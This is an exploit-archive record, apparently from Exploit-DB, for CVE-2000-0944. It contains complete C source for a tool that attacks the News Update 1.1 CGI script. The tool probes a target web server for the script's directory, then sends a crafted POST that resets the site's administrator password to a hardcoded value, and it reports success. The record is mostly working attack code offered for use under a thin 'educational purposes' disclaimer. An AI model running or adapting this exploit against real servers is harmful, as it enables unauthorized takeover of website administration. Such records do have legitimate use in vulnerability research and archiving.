{
  "id": "179",
  "title": "News Update 1.1 - Change Admin Password",
  "cve": "CVE-2000-0944",
  "vuln_type": "unknown",
  "code": "/***************************************************************************\r\n                          news_exp.c  -  description\r\n                             -------------------\r\n    begin                : Sat Oct 21 2000\r\n    copyright            : (C) 2000 by Morpheus[bd]\r\n    email                : morpheusbd@gmx.net\r\n    advisory\t\t : www.brightdarkness.de\r\n\r\n    Exploit code for the News Update 1.1 by Morpheus[bd]\r\n    For more information see my advisory which should be in this .tar.gz\r\n    package.\r\n\r\n    Compiling/Linking: gcc exploit.c -o exploit\r\n    Usage: will be printed when the exploit is started without arguments\r\n\r\n ***************************************************************************/\r\n\r\n/***************************************************************************\r\n                         [Disclaimer]\r\n  Standard disclaimer applies here. Do not use this program. This program\r\n  is only for educational purposes. Use it on your on risk.\r\n\r\n ***************************************************************************/\r\n\r\n/***************************************************************************\r\n *                                                                         *\r\n *   This program is free software; you can redistribute it and/or modify  *\r\n *   it under the terms of the GNU General Public License as published by  *\r\n *   the Free Software Foundation; either version 2 of the License, or     *\r\n *   (at your option) any later version.                                   *\r\n *                                                                         *\r\n ***************************************************************************/\r\n\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <ctype.h>\r\n#include <stdlib.h>\r\n#include <netdb.h>\r\n#include <sys/socket.h>\r\n#include <sys/types.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n#include <errno.h>\r\n#include <fcntl.h>\r\n#include <signal.h>\r\n#include <arpa/nameser.h>\r\n#include <sys/stat.h>\r\n\r\n#define\t\t\tWEISS\t\t        printf(\"\\033[0;29m\")\r\n#define                 ROT                     printf(\"\\033[1;31m\")\r\n#define         \tGRUEN                   printf(\"\\033[1;32m\")\r\n#define\t\t        GELB                    printf(\"\\033[1;33m\")\r\n#define\t\t\tBLAU\t\t        printf(\"\\033[1;34m\")\r\n#define\t\t\tLILA\t\t        printf(\"\\033[1;35m\")\r\n#define         \tHELLROT                 printf(\"\\033[1;36m\")\r\n\r\n#define MAXBUFFER       4096\r\n\r\n/******************* AUSGABEN ************************/\r\n\r\n/* At the moment everything will be written to the STDOUT */\r\n\r\n#define EXPLOIT_INFO\t\t2 /* If you only want Exploit infos ... change it to 1 and DEBUG to 1 */\r\n#define\tDEBUG_INFO\t\t2 /* If you only want Debug infos ... change DEBUG to 2 */\r\n\r\n#define\tDEBUG\t\t\t2\r\n\r\n/*****************************************************/\r\n\r\n/* Standard-Pfad des News Update scripts */\r\n#define\tNEWSUPDATE_PATH\t\"/cgi-bin/dummy/newsup\"\r\n\r\n/* Name des News Update scripts */\r\n#define\tNEWS_UPDATE\t\"newsup.pl\"\r\n\r\n/* Das gew?schte Passwort f? die News Update Form */\r\n#define\tPWD\t\t\"morpheus\"\r\n\r\n/* HTTP-Request f? die News Update Form */\r\n#define\tNEWS_UPDATE_PWD\t\"POST %s HTTP/1.0\\r\\n\" \\\r\n\t\t\t\"Host: %s\\r\\n\" \\\r\n\t\t\t\"Referrer: %s\\r\\n\" \\\r\n\t\t\t\"Connection: Close\\r\\n\" \\\r\n\t\t\t\"User-Agent: %s\\r\\n\" \\\r\n\t\t\t\"Accept: */*\\r\\n\" \\\r\n\t\t\t\"Content-type: application/x-www-urlencoded\\r\\n\" \\\r\n\t\t\t\"Content-length: %d\\r\\n\" \\\r\n\t\t\t\"\\r\\n\" \\\r\n\t\t\t\"pwd=%s&pwd2=%s&setpwd=++Set+Password++\\r\\n\" \\\r\n\t\t\t\"\\r\\n\"\r\n\r\n/* Ein einfacher HTTP-Request um eine Datei von einem Web-Server zu saugen */\r\n#define SIMPLE_REQUEST\t\"GET %s HTTP/1.0\\r\\n\" \\\r\n\t\t\t\"Host: %s\\r\\n\" \\\r\n\t\t\t\"\\r\\n\"\r\n\r\n#define BROWSER         \"Morphi-Browser (X11; U; Linux 2.4 i686)\"\r\n\r\nssize_t writen(int fd, const void *vptr, size_t n)\r\n/* Taken from UNIX Network Programming - Vol. I by W.R. Stevens */\r\n  {\r\n    size_t nleft;\r\n    ssize_t nwritten;\r\n    const char *ptr;\r\n\r\n    ptr = vptr;\r\n    nleft = n;\r\n    while(nleft > 0) {\r\n      if ( (nwritten = write(fd, ptr, nleft)) <= 0) {\r\n        if (errno == EINTR)\r\n          nwritten = 0;\r\n        else\r\n          return (-1);\r\n      }\r\n      nleft -= nwritten;\r\n      ptr += nwritten;\r\n    }\r\n    return (n);\r\n  }\r\n\r\nstatic ssize_t my_read(int fd, char *ptr)\r\n/* Taken from UNIX Network Programming - Vol. I by W.R. Stevens */\r\n{\r\n\tstatic int\tread_cnt = 0;\r\n\tstatic char\t*read_ptr;\r\n\tstatic char\tread_buf[4096];\r\n\r\n\tif (read_cnt <= 0) {\r\nagain:\r\n\t\tif ( (read_cnt = read(fd, read_buf, sizeof(read_buf))) < 0) {\r\n\t\t  if (errno == EINTR)\r\n\t\t    goto again;\r\n\t\t\treturn(-1);\r\n\t\t} else if (read_cnt == 0)\r\n\t\t\treturn(0);\r\n\t\tread_ptr = read_buf;\r\n\t}\r\n\r\n\tread_cnt--;\r\n\t*ptr = *read_ptr++;\r\n\treturn(1);\r\n}\r\n\r\nssize_t readline(int fd, void *vptr, size_t maxlen)\r\n/* Taken from UNIX Network Programming - Vol. I by W.R. Stevens */\r\n{\r\n\tint\t\tn, rc;\r\n\tchar\tc, *ptr;\r\n\r\n\tptr = vptr;\r\n\tfor (n = 1; n < maxlen; n++) {\r\n\t\tif ( (rc = my_read(fd, &c)) == 1) {\r\n\t\t\t*ptr++ = c;\r\n\t\t\tif (c == '\\n')\r\n\t\t\t\tbreak;\t/* newline is stored, like fgets() */\r\n\t\t} else if (rc == 0) {\r\n\t\t\tif (n == 1)\r\n\t\t\t\treturn(0);\t/* EOF, no data read */\r\n\t\t\telse\r\n\t\t\t\tbreak;\t\t/* EOF, some data was read */\r\n\t\t} else\r\n\t\t\treturn(-1);\t\t/* error, errno set by read() */\r\n\t}\r\n\r\n\t*ptr = 0;\t/* null terminate like fgets() */\r\n\treturn(n);\r\n}\r\n\r\n/* Stellt die Verbindung zum HTTP-Port des Servers her */\r\nint http_connection(char host[100])\r\n  {\r\n    struct sockaddr_in sa;\r\n    struct hostent *hp;\r\n\r\n    int sockfd;\r\n    int port = 80;\r\n\r\n    sockfd = socket(AF_INET, SOCK_STREAM, 0);\r\n    bzero(&sa, sizeof(sa));\r\n    sa.sin_family = AF_INET;\r\n    sa.sin_port = htons(port);\r\n    if ( (sa.sin_addr.s_addr = inet_addr(host)) == -1)\r\n      {\r\n        if ( (hp = (struct hostent *) gethostbyname(host)) == NULL)\r\n          {\r\n            ROT;\r\n            perror(\"gethostbyname:\");\r\n            WEISS;\r\n            return (-1);\r\n          }\r\n        memcpy(&sa.sin_addr.s_addr,hp->h_addr,sizeof(hp->h_addr));\r\n      }\r\n\r\n    if (connect(sockfd, (struct sockaddr *) &sa, sizeof(sa)) < 0)\r\n      {\r\n        ROT;\r\n        perror(\"Connect:\");\r\n        close(sockfd);\r\n        WEISS;\r\n        return (-1);\r\n      }\r\n    return sockfd;\r\n  }\r\n\r\n\r\n/* Exploited das News Update script und schleu? ein neues Password ein */\r\nint news_update_exploit(char *host, char *path)\r\n  {\r\n    int i = 0, sockfd = 0;\r\n    char cmd[MAXBUFFER];\r\n\r\n    if ((sockfd = http_connection(host)) == -1) { ROT; printf(\"Damn ... no connection to %s\\n\", host); WEISS; return; }\r\n\r\n    i = snprintf(cmd, sizeof(cmd), NEWS_UPDATE_PWD, path, host, \"www.brightdarkness.de\", BROWSER, 34 + strlen(PWD), PWD, PWD);\r\n    GELB;\r\n    if (DEBUG == DEBUG_INFO) { GELB; printf(\"Sending following request to %s[%d]:\\n%s\", host, 80, cmd); WEISS; }\r\n    WEISS;\r\n    if (writen(sockfd, cmd, i) == -1)\r\n      {\r\n        ROT;\r\n        printf(\"Man, man, man ....... Ihr verdammten Idioten .... kann man hier nicht mal in Ruhe writen() ?\\n\");\r\n        WEISS;\r\n        exit(-1);\r\n      }\r\n\r\n    GELB;\r\n    if (DEBUG == DEBUG_INFO) printf(\"Output from Server:\\n\");\r\n    WEISS;\r\n    while (readline(sockfd, cmd, MAXBUFFER) != 0)\r\n      {\r\n      \tBLAU;\r\n      \tif (DEBUG == DEBUG_INFO) printf(\"%s\", cmd);\r\n      \tWEISS;\r\n      \tif (strstr(cmd, \"Password Success\") != NULL)\r\n      \t  {\r\n      \t    GRUEN;\r\n      \t    if (DEBUG == EXPLOIT_INFO) printf(\"Exploit: Success!!!!\\n\");\r\n      \t    if (DEBUG == EXPLOIT_INFO) printf(\"The new password: %s\\n\", PWD);\r\n      \t    WEISS;\r\n      \t    return (0);\r\n      \t  }\r\n      }\r\n    ROT;\r\n    if (DEBUG == EXPLOIT_INFO) printf(\"Exploit: failed.\\n\");\r\n    WEISS;\r\n    return (-1);\r\n  }\r\n\r\n/* How to use this fucking lame proggy *rofl* */\r\nvoid usage(char *arg)\r\n  {\r\n    ROT;\r\n    printf(\"news_update_exploit - News Update Password Changer - v0.1\\n\");\r\n    printf(\"------------=====||| by Morpheus[bd] |||=====------------\\n\");\r\n    GELB;\r\n    printf(\"\\nUsage:\");\r\n    GRUEN;\r\n    printf(\"%s host/ip [path]\\n\\n\", arg);\r\n    printf(\"path: alternative path to the newsup.pl\\n\");\r\n    WEISS;\r\n    exit(-1);\r\n  }\r\n\r\n/* Existiert das Verzeichnis der Form ?erhaupt ? */\r\nint check_directory(char *host, char *ptr)\r\n  {\r\n    int i = 0, sockfd = 0;\r\n    char cmd[MAXBUFFER], *ptr2;\r\n\r\n    ptr2 = ptr + strlen(ptr);\r\n    if (*(ptr2 - 1) != '/')\r\n      {\r\n        *ptr2 = '/';\r\n        *(ptr2 + 1) = '\\0';\r\n      }\r\n\r\n    GELB;\r\n    if (DEBUG == DEBUG_INFO) printf(\"Checking if %s exists on the target server...\\n\", ptr);\r\n    WEISS;\r\n\r\n    if ((sockfd = http_connection(host)) == -1) { ROT; printf(\"Damn !!!... No connection to %s.\\n\", host); WEISS; return; }\r\n\r\n    i = snprintf(cmd, sizeof(cmd), SIMPLE_REQUEST, ptr, host);\r\n    GELB;\r\n    if (DEBUG == DEBUG_INFO) printf(\"Sending following request to %s[%d]:\\n%s\", host, 80, cmd);\r\n    WEISS;\r\n    if (writen(sockfd, cmd, i) == -1)\r\n      {\r\n        ROT;\r\n        printf(\"Man, man, man ....... Ihr verdammten Idioten .... kann man hier nicht mal in Ruhe writen() ?\\n\");\r\n        WEISS;\r\n        exit(-1);\r\n      }\r\n\r\n    if (readline(sockfd, cmd, MAXBUFFER) == 0)\r\n      {\r\n        ROT;\r\n        printf(\"Error: Reading from HTTP Server.\\n\");\r\n        WEISS;\r\n        exit(-1);\r\n      }\r\n    if (strstr(cmd, \"404\") == NULL)\r\n      {\r\n        GRUEN;\r\n        if (DEBUG == DEBUG_INFO) printf(\"The directory was found.\\n\");\r\n        WEISS;\r\n        while (readline(sockfd, cmd, MAXBUFFER) != 0);\r\n        close(sockfd);\r\n        return (0);\r\n      }\r\n\r\n    if (DEBUG == DEBUG_INFO) printf(\"The directory was NOT found.\\n\");\r\n    while (readline(sockfd, cmd, MAXBUFFER) != 0);\r\n    close(sockfd);\r\n    return (-1);\r\n  }\r\n\r\n/* Das tolle Hauptprogramm *fg* */\r\nint main(int argc, char **argv)\r\n {\r\n   char buf[MAXBUFFER];\r\n\r\n   if (argc < 2)\r\n     {\r\n       usage(argv[0]);\r\n     }\r\n\r\n   if (argc >= 3)\r\n     {\r\n       /* Ein alternatives Verzeichnis wurde als Parameter ?ergeben */\r\n       strncpy(buf, argv[2], sizeof(buf));\r\n       if (check_directory(argv[1], buf) == -1)\r\n         {\r\n           ROT;\r\n           printf(\"Error: The given directory was not found.\\nPlease provide a different directory.\\n\");\r\n           WEISS;\r\n           exit(-1);\r\n         }\r\n       strcat(buf, NEWS_UPDATE);\r\n     }\r\n   else\r\n     {\r\n       /* Kein alternatives Verz. angegeben, benutze Standard-Verzeichnis */\r\n       strncpy(buf, NEWSUPDATE_PATH, sizeof(buf));\r\n       if (check_directory(argv[1], buf) == -1)\r\n         {\r\n           ROT;\r\n           printf(\"Error: The given directory was not found.\\nPlease provide a different directory.\\n\");\r\n           WEISS;\r\n           exit(-1);\r\n         }\r\n       strcat(buf, NEWS_UPDATE);\r\n    }\r\n\r\n   /* Let's rock !!!! */\r\n   news_update_exploit(argv[1], buf);\r\n   return (0);\r\n }\r\n\r\n\r\n// milw0rm.com [2000-11-15]",
  "url": "https://www.exploit-db.com/exploits/179"
}